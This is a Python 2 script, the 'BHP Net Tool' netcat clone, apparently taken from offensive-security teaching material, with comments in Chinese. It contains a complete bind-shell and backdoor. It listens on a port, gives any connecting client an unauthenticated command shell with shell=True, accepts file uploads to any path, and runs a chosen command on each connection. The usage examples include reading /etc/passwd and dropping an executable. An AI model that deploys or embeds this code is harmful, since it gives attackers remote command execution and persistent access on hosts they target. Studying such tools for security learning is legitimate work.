#-*- coding: UTF-8 -*- 
import sys
import socket
import getopt
import threading
import subprocess


#全局变量定义
listen   =False
command  =False
upload   =False
execute  =""
target   =""
upload_destination =""
port     =0

def server_loop():
    global  target

    #如果没有定义目标，监听所有端口

    if not len(target):
        target="0.0.0.0"

    server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((target,port))

    server.listen(5)

    while True:
        client_socket,addr=server.accept()

        #创建新线程处理新的客户端
        client_thread=threading.Thread(target=client_handler,args=(client_socket,))
        client_thread.start()





def run_command(command):

    #去除换行

    command=command.rstrip()
    #运行命令并将输入返回
    try:

        output=subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
    except:
        output="Failed to execute command. \r\n"
    #发送输出
    return output


def client_handler(client_socket):
    global upload
    global execute
    global command

   #检测上传文件
    if len(upload_destination):
        file_buffer=""
        while True:
            data=client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data
        try:
            file_descriptor=open(upload_destination,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            #确认文件写出成功
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)
    if len(execute):
        output=run_command(execute)
        client_socket.send(output)

    #命令行shell
    if command:
        while True:
            client_socket.send("<BHP:#> ")
            #接受输入直到 enter key
            cmd_buffer=""
            while "\n" not in cmd_buffer:
                cmd_buffer+=client_socket.recv(1024)
            #执行命令 并返回输出
            response=run_command(cmd_buffer)
            client_socket.send(response)

        
def usage():
    print "BHP Net Tool"
    print
    print "Usage: bhpnet.py -t target_host -p port"
    print """-l --listen                   - listen on [host]:[port] for incoming 
                                           connections"""
    print """-e --execute=file_to_run      -execute the given file upon receiving
                                           a connection"""
    print """-c --command                  - initialize a command shell"""
    print """-u --upload=destination       - upon receiving connection upload a
                                           file and write to [destination]"""
    print
    print
    print "Examples: "
    print "bhnet.py -t 192.168.0.1 -p 5555 -l -c"
    print "bhnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
    print "bhnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGHI'| ./bhpnet.py -t 192.168.11.12 -p 135"
    sys.exit(0)




def client_sender(buffer):
    client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        client.connect((target,port))

        if len(buffer):
            client.send(buffer)

        while True:

            recv_len=1
            response=""

            while recv_len:

                data=client.recv(4096)
                recv_len=len(data)
                response+=data

                if recv_len<4096:
                    break

            print response,

            buffer=raw_input("")
            buffer+="\n"

            client.send(buffer)
    except:
        print "[*] Exception! Exiting."

        client.close()






def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target
    


    if not len(sys.argv[1:]):
        usage()
    #读取命令行内容
    try:
        opts,args=getopt.getopt(sys.argv[1:],"hle:t:p:cu:",["help","listen","execute","target","port","command","upload"])
    except getopt.GetoptError as err:
        print str(err)
        usage()

    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-l","--listen"):
            listen=True
        elif o in ("-e","--execute"):
            execute=a
        elif o in ("-c","--commandshell"):
            command=True
        elif o in ("-u","--upload"):
            upload_destination=a
        elif o in ("-t","--target"):
            target=a
        elif o in ("-p","--port"):
            port=int(a)
        else:
            assert False,"Unhandled Option"

     #判断 进行监听 or 发送数据
    if not listen and len(target) and port >0:

        #读取数据 直到CTRL-D
        buffer = sys.stdin.read()
        #发送数据
        client_sender(buffer)

    #开始监听并准备上传文件，执行命令
    #放置反弹shell
    #
    if listen:
        server_loop()

main()





















    
